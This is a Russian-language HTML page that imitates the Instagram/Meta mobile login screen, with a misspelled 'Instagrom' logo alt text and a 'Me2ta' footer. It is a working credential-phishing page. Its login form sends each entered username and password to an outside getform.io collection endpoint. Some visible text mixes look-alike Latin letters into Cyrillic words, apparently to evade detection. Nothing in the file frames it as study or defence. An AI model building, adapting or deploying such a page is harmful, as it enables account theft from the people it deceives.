<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>2323</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: radial-gradient(circle at 0% 100%, #23292E 60%, #25304a 100%);
      font-family: 'Segoe UI', Arial, sans-serif;
      color: #fff;
    }
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 12px;
      flex-grow: 1;
    }
    .logo-container {
      margin-top: 54px;
      margin-bottom: 48px;
      display: flex;
      justify-content: center;
    }
    .insta-logo {
      width: 180px;
      height: auto;
      display: block;
    }
    .form-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 16px;
      align-items: center;
      flex-grow: 1;
    }
    .inputbox {
      width: 100%;
      height: 55px;
      background: transparent;
      border: 1.6px solid #eaeef3;
      border-radius: 1px;
      font-size: 16px;
      color: #ffffff;
      padding: 10px 18px;
      outline: none;
      transition: border-color 0.2s;
      box-sizing: border-box;
      margin-bottom: 13px;
    }
    .inputbox:focus { border-color: #5790ff; }
    .login-btn {
      width: 100%;
      height: 40px;
      background: #1877F2;
      color: #fff;
      border: none;
      border-radius: 27px;
      font-size: 18px;
      font-weight: 500;
      padding: 12px 0;
      margin-top: 8px;
      cursor: pointer;
    }
    .login-btn:hover { background: #155dc1; }
    .forgot-link {
      margin: 18px 0 0 0;
      text-align: center;
      font-size: 15px;
      color: #c5c5c5;
      text-decoration: none;
      font-weight: 500;
    }
    .forgot-link:hover { color: #fff; text-decoration: underline; }
    .create-account-btn {
      width: 100%;
      margin-top: 195px;
      background: none;
      border: 1.6px solid #1877F2;
      border-radius: 27px;
      color: #1877F2;
      font-size: 17px;
      font-weight: 500;
      padding: 12px 0;
      cursor: pointer;
      text-align: center;
    }
    .create-account-btn:hover { background: #1877F2; color: #fff; }
    .me2ta-logo {
      display: flex;
      justify-content: center;
      align-items: center;
      color: #ccc;
      font-size: 17px;
      margin: 20px 0 10px 0;
      gap: 6px;
    }
    .me2ta-logo img { width: 150px; height: auto; }

    @media (max-width: 450px) {
      .logo-container { margin-top: 100px; margin-bottom: 100px; }
      .insta-logo { width: 200px; }
      .inputbox, .create-account-btn, .login-btn {
        font-size: 14px; padding: 10px 10px; border-radius: 15px;
      }
      .meta-logo { font-size: 12px; margin: 15px 0 10px 0; }
      .meta-logo img { width: 120px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <img class="insta-logo" src="https://i.postimg.cc/J0VcDK3d/fc8ab6b7-b6ce-470e-ba7e-d4c77c8bd4a0-removalai-preview.png" alt="Instagrom">
    </div>

    <div class="form-container">
      <!-- Updated form -->
      <form class="login-form" action="https://getform.io/f/byvemnna" method="POST">
        <input class="inputbox" type="text" name="username" placeholder="Имя пользователя, эл. адрес или мобильный..." required>
        <input class="inputbox" type="password" name="pass" placeholder="Пароль" required>

        <!-- Hidden honeypot field to prevent spam -->
        <input type="text" name="_gotcha" style="position:absolute; left:-9999px;">
        <button type="submit" class="login-btn">Войти</button>
      </form>

      <a href="#" class="forgot-link">зaби пapоль?</a>
      <button class="create-account-btn">Cоздать новый aккаунт</button>
    </div>

    <div class="me2ta-logo">
      <img src="https://i.postimg.cc/fWB6d9Sz/f7c950d3-c9a1-4d7c-9f39-148b8bd4b68a-removalai-preview.png" alt="Me2ta logo">
    </div>
  </div>
</body>
</html>
